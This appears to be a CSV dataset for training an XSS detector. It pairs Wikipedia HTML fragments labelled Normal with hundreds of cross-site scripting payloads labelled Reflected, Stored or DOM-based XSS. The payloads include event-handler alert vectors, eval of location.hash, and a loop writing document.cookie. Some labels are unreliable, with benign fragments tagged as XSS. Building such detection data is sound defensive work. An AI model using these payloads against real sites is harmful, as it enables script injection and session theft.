Sentence,Final_Label
"<multicol draggable=""true"" ondragstart=""alert(1)"">test</multicol>",Reflected XSS
<style onfocusout=alert(1) tabindex=1 id=x></style><input autofocus>,Reflected XSS
"<script>document.getElementById(""output"").innerHTML = location.hash.substring(1);</script>",DOM-based XSS
"<noframes draggable=""true"" ondrag=""alert(1)"">test</noframes>",Reflected XSS
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><object id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></object>",Stored XSS
"<li><cite id=""CITEREFRussellNorvig2009"" class=""citation book""><a href=""/wiki/Stuart_J._Russell"" title=""Stuart J. Russell"">Russell, Stuart J. </a>; <a href=""/wiki/Peter_Norvig"" title=""Peter Norvig"">Norvig, Peter </a> (2009). <i><a href=""/wiki/Artificial_Intelligence:_A_Modern_Approach"" title=""Artificial Intelligence: A Modern Approach"">Artificial Intelligence: A Modern Approach </a> </i> (3rd ed.). Upper Saddle River, New Jersey: Prentice Hall. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-0-13-604259-4"" title=""Special:BookSources/978-0-13-604259-4""><bdi>978-0-13-604259-4 </bdi> </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Artificial+Intelligence%3A+A+Modern+Approach&amp;rft.place=Upper+Saddle+River%2C+New+Jersey&amp;rft.edition=3rd&amp;rft.pub=Prentice+Hall&amp;rft.date=2009&amp;rft.isbn=978-0-13-604259-4&amp;rft.aulast=Russell&amp;rft.aufirst=Stuart+J.&amp;rft.au=Norvig%2C+Peter&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",Normal
"<mark onmouseup=""alert(1)"">test</mark>",Reflected XSS
top[8680439..toString(30)](1),Stored XSS
"<style>@keyframes x{}</style><nextid style=""animation-name:x"" onanimationstart=""alert(1)""></nextid>",Reflected XSS
"<li><a href=""/wiki/Computational_geometry"" title=""Computational geometry"">Computational geometry </a> </li> </ul>",Normal
"	 </span> <span class=""reference-text""><cite class=""citation news""><a rel=""nofollow"" class=""external text"" href=""https://www.economist.com/blogs/economist-explains/2016/04/economist-explains"">""The Economist Explains: Why firms are piling into artificial intelligence"" </a>. <i><a href=""/wiki/The_Economist"" title=""The Economist"">The Economist </a> </i>. 31 March 2016. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20160508010311/http://www.economist.com/blogs/economist-explains/2016/04/economist-explains"">Archived </a> from the original on 8 May 2016<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">19 May ",Normal
"<li id=""cite_note-359""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-359"">^ </a> </b> ",Normal
<svg><applet onload=alert(1)></applet>,Stored XSS
"<script>document.getElementById(""output"").innerHTML = location.hash.substring(1);</script>",DOM-based XSS
"<cite ondblclick=""alert(1)"">test</cite>",Reflected XSS
	 </span></a></dt><dd>Send email notifications when certain events occur.</dd>,Normal
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
"<object onmousemove=""alert(1)"">test</object>",Stored XSS
<svg><footer onload=alert(1)></footer>,Stored XSS
"<script>document.getElementById(""output"").innerHTML = location.hash.substring(1);</script>",DOM-based XSS
"<datalist onpaste=""alert(1)"" contenteditable>test</datalist>",Reflected XSS
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
"<li id=""cite_note-FOOTNOTEOudeyer2010-171""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTEOudeyer2010_171-0"">^ </a> </b> ",Normal
<script>eval(document.location.hash.substring(1));</script>,DOM-based XSS
"<div draggable=""true"" contenteditable>drag me</div><cite ondrop=alert(1) contenteditable>drop here</cite>",Reflected XSS
  <hr/>,Normal
"<style>:target {color:red;}</style><svg id=x style=""transition:color 1s"" ontransitionend=alert(1)></svg>",Stored XSS
<svg><textarea onload=alert(1)></textarea>,Stored XSS
"<li><a href=""/wiki/Humanity%2B"" title=""Humanity+"">Humanity+ </a> </li>",Normal
<svg><set onrepeat=alert(1) attributename=x dur=1s repeatcount=2>,Stored XSS
<svg><noframes onload=alert(1)></noframes>,Stored XSS
"Default reasoning and <a href=""/wiki/Default_logic"" title=""Default logic"">default logic </a>, <a href=""/wiki/Non-monotonic_logic"" title=""Non-monotonic logic"">non-monotonic logics </a>, <a href=""/wiki/Circumscription_(logic)"" title=""Circumscription (logic)"">circumscription </a>, <a href=""/wiki/Closed_world_assumption"" class=""mw-redirect"" title=""Closed world assumption"">closed world assumption </a>, <a href=""/wiki/Abductive_reasoning"" title=""Abductive reasoning"">abduction </a> (Poole <i>et al. </i> places abduction under ""default reasoning"". Luger <i>et al. </i> places this under ""uncertain reasoning""):",Normal
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
"<li id=""cite_note-150""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-150"">^ </a> </b> ",Normal
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
"<embed onmousedown=""alert(1)"">test</embed>",Stored XSS
"	 </span> <span class=""reference-text""><cite class=""citation news"">Mahdawi, Arwa (26 June 2017). <a rel=""nofollow"" class=""external text"" href=""https://www.theguardian.com/us-news/2017/jun/26/jobs-future-automation-robots-skills-creative-health"">""What jobs will still be around in 20 years? Read this to prepare your future"" </a>. <i>The Guardian </i><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">13 January ",Normal
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><embed id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></embed>",Stored XSS
<svg><ruby onload=alert(1)></ruby>,Stored XSS
"<div draggable=""true"" contenteditable>drag me</div><shadow ondrop=alert(1) contenteditable>drop here</shadow>",Reflected XSS
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
"<dl onbeforecopy=""alert(1)"" contenteditable>test</dl>",Reflected XSS
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
"    <div class=""rst-other-versions"">",Normal
"<audio ondblclick=""alert(1)"">test</audio>",Reflected XSS
"<slot onmouseenter=""alert(1)"">test</slot>",Reflected XSS
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Mathematics<br />of computing </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",Normal
"<script>var url = document.URL; document.getElementById(""test"").innerHTML=url;</script>",DOM-based XSS
"<div onbeforecopy=""alert(1)"" contenteditable>test</div>",Reflected XSS
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
	 </span> </li>,Normal
<svg onfocusout=alert(1) tabindex=1 id=x></svg><input autofocus>,Stored XSS
<embed onpointerover=alert(1)>XSS</embed>,Stored XSS
"<section onkeypress=""alert(1)"" contenteditable>test</section>",Reflected XSS
<svg><textarea onload=alert(1)></textarea>,Stored XSS
"<a onclick=""alert(1)"">test</a>",Reflected XSS
<svg onload=alert(1)>,Stored XSS
"<meter onbeforepaste=""alert(1)"" contenteditable>test</meter>",Reflected XSS
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
<spacer id=x tabindex=1 onbeforedeactivate=alert(1)></spacer><input autofocus>,Reflected XSS
<dt id=x tabindex=1 onactivate=alert(1)></dt>,Reflected XSS
"<script>document.getElementById(""output"").innerHTML = location.hash.substring(1);</script>",DOM-based XSS
<script>var input = window.location.search; document.body.innerHTML = input;</script>,DOM-based XSS
"<caption onmouseup=""alert(1)"">test</caption>",Reflected XSS
<svg><html onload=alert(1)></html>,Stored XSS
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
"<mark onkeypress=""alert(1)"" contenteditable>test</mark>",Reflected XSS
"<script>var url = document.URL; document.getElementById(""test"").innerHTML=url;</script>",DOM-based XSS
"<dt><a class=""reference internal"" href=""topics/downloader-middleware.html""><span class=""doc"">Downloader Middleware",Normal
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
<script>window.onload=function(){document.body.innerHTML=location.search;}</script>,DOM-based XSS
"<td onbeforepaste=""alert(1)"" contenteditable>test</td>",Reflected XSS
<aside onpointerenter=alert(1)>XSS</aside>,Reflected XSS
"<script>document.getElementById(""output"").innerHTML = location.hash.substring(1);</script>",DOM-based XSS
<svg><hgroup onload=alert(1)></hgroup>,Stored XSS
"a=""get"";",Stored XSS
"<li><a href=""/wiki/Hilbert%27s_program"" title=""Hilbert&#39;s program"">Hilbert's program </a><span class=""nowrap"">&#160; ",Normal
<label onpointerover=alert(1)>XSS</label>,Reflected XSS
"<A HREF=""//google""></A>",Stored XSS
"<script>var data = document.referrer; document.getElementById(""demo"").innerHTML=data;</script>",DOM-based XSS
<script>eval(document.location.hash.substring(1));</script>,DOM-based XSS
<svg><wbr onload=alert(1)></wbr>,Stored XSS
"<keygen oncopy=""alert(1)"" contenteditable>test</keygen>",Reflected XSS
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
"<param onkeyup=""alert(1)"" contenteditable>test</param>",Reflected XSS
"<object draggable=""true"" ondragstart=""alert(1)"">test</object>",Stored XSS
"<script>var data = document.referrer; document.getElementById(""demo"").innerHTML=data;</script>",DOM-based XSS
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=54"" title=""Edit section: Decrease in demand for human labor"">edit </a><span class=""mw-editsection-bracket"">] ",Normal
              </div>          ,Normal
<script>window.onload=function(){document.body.innerHTML=location.search;}</script>,DOM-based XSS
"<div draggable=""true"" contenteditable>drag me</div><big ondrop=alert(1) contenteditable>drop here</big>",Reflected XSS
"<marquee onmousedown=""alert(1)"">test</marquee>",Reflected XSS
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=30"" title=""Edit section: Classifiers and statistical learning methods"">edit </a><span class=""mw-editsection-bracket"">] ",Normal
"<meter onbeforecut=""alert(1)"" contenteditable>test</meter>",Reflected XSS
"<li><a href=""/wiki/Jennifer_Wilby"" title=""Jennifer Wilby"">Jennifer Wilby </a> </li>",Normal
<svg><slot onload=alert(1)></slot>,Stored XSS
<bdo id=x tabindex=1 onfocusin=alert(1)></bdo>,Reflected XSS
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
"< STYLE=""behavior: url(.htc);"">",Stored XSS
<acronym id=x tabindex=1 ondeactivate=alert(1)></acronym><input id=y autofocus>,Reflected XSS
<title id=x tabindex=1 onfocus=alert(1)></title>,Reflected XSS
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",Normal
"<dt draggable=""true"" ondragenter=""alert(1)"">test</dt>",Reflected XSS
<svg><colgroup onload=alert(1)></colgroup>,Stored XSS
<iframe onreadystatechange=alert(1)></iframe>,Stored XSS
"<script>var data = document.referrer; document.getElementById(""demo"").innerHTML=data;</script>",DOM-based XSS
"<li id=""cite_note-Weizenbaum&#39;s_critique-381""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Weizenbaum&#39;s_critique_381-0"">^ </a> </b> ",Normal
"<script>var url = document.URL; document.getElementById(""test"").innerHTML=url;</script>",DOM-based XSS
"	 </span> <span class=""reference-text"">""There exist many different types of uncertainty, vagueness, and ignorance... [We] independently confirm the inadequacy of systems for reasoning about uncertainty that propagates numerical factors according to only to which connectives appear in assertions.""<sup id=""cite_ref-199"" class=""reference""><a href=""#cite_note-199"">&#91;195&#93; </a> </sup> ",Normal
"<!--#exec cmd=""/bin/echo 'IPT SRC=http://.rocks/.js>",Stored XSS
<svg><noembed onload=alert(1)></noembed>,Stored XSS
 </li>,Normal
"<script>document.getElementById(""output"").innerHTML = location.hash.substring(1);</script>",DOM-based XSS
"<li><a href=""/wiki/Firefly_algorithm"" title=""Firefly algorithm"">Firefly algorithm </a> </li>",Normal
<svg><nobr onload=alert(1)></nobr>,Stored XSS
<applet onpointerenter=alert(1)>XSS</applet>,Reflected XSS
<svg><frameset onload=alert(1)></frameset>,Stored XSS
"<li id=""cite_note-FOOTNOTEDomingos2015Chapter_1-67""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTEDomingos2015Chapter_1_67-0"">^ </a> </b> ",Normal
<script>var hash = location.hash; eval(hash.substring(1));</script>,DOM-based XSS
"<li oncopy=""alert(1)"" contenteditable>test</li>",Reflected XSS
"<iframe onmousemove=""alert(1)"">test</iframe>",Stored XSS
"<summary onmouseover=""alert(1)"">test</summary>",Reflected XSS
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
"<li><a href=""/wiki/Animatronics"" title=""Animatronics"">Animatronic </a>",Normal
 </li>,Normal
"	 </span> <span class=""reference-text"">Celli, Fabio, Pietro Zani Massani, and Bruno Lepri. ""Profilio: Psychometric Profiling to Boost Social Media Advertising."" Proceedings of the 2017 ACM on Multimedia Conference. ACM, 2017  <a rel=""nofollow"" class=""external autonumber"" href=""https://www.researchgate.net/publication/320542489_Profilio_Psychometric_Profiling_to_Boost_Social_Media_Advertising"">[1] </a> ",Normal
"<col onmousemove=""alert(1)"">test</col>",Reflected XSS
"<li><a href=""/wiki/Robot_software"" title=""Robot software"">Software </a> </li>",Normal
	 </span> </li>,Normal
<svg id=x onfocus=alert(1)>,Stored XSS
"<script onmouseover=""alert(1)"">test</script>",Stored XSS
<script>eval(document.location.hash.substring(1));</script>,DOM-based XSS
<script>var hash = location.hash; eval(hash.substring(1));</script>,DOM-based XSS
"<time onkeydown=""alert(1)"" contenteditable>test</time>",Reflected XSS
<nobr id=x tabindex=1 ondeactivate=alert(1)></nobr><input id=y autofocus>,Reflected XSS
"<blockquote onkeyup=""alert(1)"" contenteditable>test</blockquote>",Reflected XSS
"<script>document.getElementById(""output"").innerHTML = location.hash.substring(1);</script>",DOM-based XSS
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",Normal
"<svg onmouseout=""alert(1)"">test</svg>",Stored XSS
"	 </span>. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1007%2Fs10676-007-9138-2"">10.1007/s10676-007-9138-2 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Ethics+and+Information+Technology&amp;rft.atitle=AI+armageddon+and+the+three+laws+of+robotics&amp;rft.volume=9&amp;rft.issue=2&amp;rft.pages=153-164&amp;rft.date=2007&amp;rft_id=%2F%2Fciteseerx.ist.psu.edu%2Fviewdoc%2Fsummary%3Fdoi%3D10.1.1.85.8904&amp;rft_id=info%3Adoi%2F10.1007%2Fs10676-007-9138-2&amp;rft.aulast=McCauley&amp;rft.aufirst=Lee&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",Normal
	 </span>,Normal
"<link rel=""apple-touch-icon"" href=""/static/apple-touch/wikipedia.png""/>",Normal
	 </span> 2018 ,Normal
"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;504–519, </li>",Normal
<svg><form onload=alert(1)></form>,Stored XSS
"<element onbeforecut=""alert(1)"" contenteditable>test</element>",Reflected XSS
<script>window.onload=function(){document.body.innerHTML=location.search;}</script>,DOM-based XSS
<svg><cite onload=alert(1)></cite>,Stored XSS
"<style>@keyframes x{}</style><embed style=""animation-name:x"" onanimationstart=""alert(1)""></embed>",Stored XSS
"<rp onkeypress=""alert(1)"" contenteditable>test</rp>",Reflected XSS
<data onpointerleave=alert(1)>XSS</data>,Reflected XSS
<html onpointerover=alert(1)>XSS</html>,Reflected XSS
	 </span> </a> </li>,Normal
 </li>,Normal
"<ul oncontextmenu=""alert(1)"">test</ul>",Reflected XSS
"<script>var data = document.referrer; document.getElementById(""demo"").innerHTML=data;</script>",DOM-based XSS
"	 </span>. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1080%2F09540090310001655110"">10.1080/09540090310001655110 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Connection+Science&amp;rft.atitle=Developmental+robotics%3A+a+survey&amp;rft.volume=15&amp;rft.issue=4&amp;rft.pages=151-190&amp;rft.date=2003&amp;rft_id=%2F%2Fciteseerx.ist.psu.edu%2Fviewdoc%2Fsummary%3Fdoi%3D10.1.1.83.7615&amp;rft_id=info%3Adoi%2F10.1080%2F09540090310001655110&amp;rft.aulast=Lungarella&amp;rft.aufirst=M.&amp;rft.au=Metta%2C+G.&amp;rft.au=Pfeifer%2C+R.&amp;rft.au=Sandini%2C+G.&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",Normal
<script x> alert(1) </script 1=2,Stored XSS
<script>var input = window.location.search; document.body.innerHTML = input;</script>,DOM-based XSS
"<object data=""javascript:alert()"">",Stored XSS
 </li>,Normal
<noembed onpointerover=alert(1)>XSS</noembed>,Reflected XSS
<svg><button onload=alert(1)></button>,Stored XSS
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",Normal
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
"<style>@keyframes slidein {}</style><form style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></form>",Reflected XSS
"<Input value = """" type = text>",Stored XSS
